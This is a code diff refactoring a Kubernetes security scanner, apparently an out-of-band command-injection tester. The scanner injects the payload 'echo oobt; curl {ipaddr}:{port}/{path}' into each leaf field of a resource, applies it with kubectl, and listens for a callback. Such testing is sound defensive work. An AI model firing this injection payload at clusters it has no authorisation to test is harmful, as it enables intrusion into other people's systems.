@@ -27,6 +27,7 @@
 #
 ######################################
 import argparse
+import copy
 import json
 import logging
 import os
@@ -35,8 +36,14 @@ import re
 import socket
 import subprocess
 import sys
+import tempfile
 import threading
 import time
+from typing import Dict
+from typing import Generator
+from typing import List
+from typing import Optional
+from typing import Union
 
 import yaml
 
@@ -110,50 +117,82 @@ def get_sarif_output(shared_queue):
     return sarif_conv.convert_to_sarif_json(result_message, artifact_url, snippet)
 
 
-def count_total_leaf_keys(data):
-    count = 0
-    key_list = []
-    for key, value in data.items():
-        if isinstance(value, dict):
-            count += count_total_leaf_keys(value)
-        else:
-            count += 1
-            key_list.append(key)
+def test_payload(filename: str):
+    redirect = "&> /dev/null"
+    if logging.getLogger().isEnabledFor(logging.DEBUG):
+        # don't supress output when debug logging
+        redirect = ""
+    # if using 'apply' and a resource already exists, the command won't run as it returns as 'unchanged'
+    # therefore 'create' and 'replace' are used
+    kube_cmd = f"kubectl create -f {filename} {redirect} || kubectl replace -f {filename} {redirect}"
 
-    return count
+    logging.debug(f"Command run: {kube_cmd}")
+    exit_code = os.system(kube_cmd)
+    if exit_code == 0:
+        # if object create/update succeeds add a small delay to allow
+        # for a possible command injection to occur, before replacing
+        # the object again with another command injection attempt
+        time.sleep(1)
 
 
-# pylint: disable=R0913
-def find_leaf_keys_and_test(data, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys=0):
+def find_leaf_keys_and_test(data: Dict, ipaddr: str, port: int) -> int:
     """
-    Iterate the spec data and test each parameter by modifying the value with the attack payload.
+    Iterate the object data and test each leaf key by modifying the value with the attack payload.
     Test cases: appending 'curl' command, TBD
     """
-    tmp_file = "/tmp/oobtkube-test.yaml"
-    for key, value in data.items():
-        if isinstance(value, dict):
-            processed_leaf_keys = find_leaf_keys_and_test(
-                value, original_file, ipaddr, port, total_leaf_keys, processed_leaf_keys
-            )
+
+    def get_leaf_keys(obj: Union[Dict, List], path: Optional[List] = None) -> Generator[List[str], None, None]:
+        """Collect all possible leaves in the k8s object"""
+        if isinstance(obj, dict):
+            items = obj.items()
+        elif isinstance(obj, list):
+            items = enumerate(obj)
         else:
-            processed_leaf_keys += 1
-            logging.info(f"Testing a leaf key: '{key}', ({processed_leaf_keys} / {total_leaf_keys})")
-            cmd = f"sed 's/{key}:.*/{key}: \"echo oobt; curl {ipaddr}:{port}\\/{key}\"/g' {original_file} > {tmp_file}"
-            logging.debug(f"Command run: {cmd}")
-            os.system(cmd)
+            return
 
-            redirect = "&> /dev/null"
-            if logging.getLogger().isEnabledFor(logging.DEBUG):
-                # don't supress output when debug logging
-                redirect = ""
-            # if using 'apply' and a resource already exists, the command won't run as it returns as 'unchanged'
-            # therefore 'create' and 'replace' are used
-            kube_cmd = f"kubectl create -f {tmp_file} {redirect} || kubectl replace -f {tmp_file} {redirect}"
+        if path is None:  # avoids W0102: Dangerous default value [] as argument (dangerous-default-value)
+            path = []
 
-            logging.debug(f"Command run: {kube_cmd}")
-            os.system(kube_cmd)
+        for key, value in items:
+            # skip modifying these top-level keys, we mostly want to test 'spec' data of k8s API objects
+            if path == [] and key in ("apiVersion", "kind", "metadata"):
+                continue
 
-    return processed_leaf_keys
+            current_path = path + [key]
+
+            if isinstance(value, (dict, list)):
+                yield from get_leaf_keys(value, current_path)
+            else:
+                yield current_path
+
+    def modify_leaf_key(obj: Union[Dict, List], path: List, value: str) -> Union[Dict, List]:
+        """Create a new object with a single modified value at the given path"""
+        new_obj = copy.deepcopy(obj)
+        current = new_obj
+
+        # Navigate to the parent of the target node
+        for key in path[:-1]:
+            current = current[key]
+
+        current[path[-1]] = value
+
+        return new_obj
+
+    leaf_keys = list(get_leaf_keys(data))
+
+    # For each leaf key, create a new modified object with an injected payload
+    for i, path in enumerate(leaf_keys):
+        path_str = ".".join(str(p) for p in path)
+        logging.info(f"Testing leaf key ({i+1} / {len(leaf_keys)}): {path_str}")
+        # TODO test more kinds of payload variations
+        payload = f"echo oobt; curl {ipaddr}:{port}/{path_str}"
+        modified_data = modify_leaf_key(data, path, payload)
+
+        with tempfile.NamedTemporaryFile(mode="w", suffix=".yaml") as tmp:
+            yaml.dump(modified_data, tmp)
+            test_payload(tmp.name)
+
+    return len(leaf_keys)
 
 
 def parse_obj_data(filename: str) -> dict:
@@ -163,13 +202,6 @@ def parse_obj_data(filename: str) -> dict:
         except yaml.YAMLError as e:
             logging.error(f"Error parsing YAML: {e}")
     return {}
-
-
-def scan_with_k8s_config(cfg_file_path: str, obj_data: dict, ipaddr: str, port: int):
-    spec_data = obj_data.get("spec", {})
-    total_leaf_keys = count_total_leaf_keys(spec_data)
-    # Apply Kubernetes config (e.g. CR for Operator, or Pod/resource for webhook)
-    find_leaf_keys_and_test(spec_data, cfg_file_path, ipaddr, port, total_leaf_keys)
 
 
 def start_socket_listener(port, shared_queue, data_received, stop_event, duration):
@@ -186,8 +218,8 @@ def start_socket_listener(port, shared_queue, data_received, stop_event, duratio
 
     logging.info(f"Listening on port {port}")
 
+    client_socket = None
     try:
-        client_socket = None
         client_socket, client_address = server_socket.accept()
         logging.info(f"Accepted connection from {client_address}")
 
@@ -373,9 +405,10 @@ def main():
 
     # Record the start time for the main function
     start_time_main = time.time()
+    elapsed_time_main = 0
 
     # Run kubectl apply command
-    scan_with_k8s_config(args.filename, obj_data, args.ip_addr, args.port)
+    find_leaf_keys_and_test(obj_data, args.ip_addr, args.port)
 
     # Check the overall duration periodically
     vulnerability_count = 0
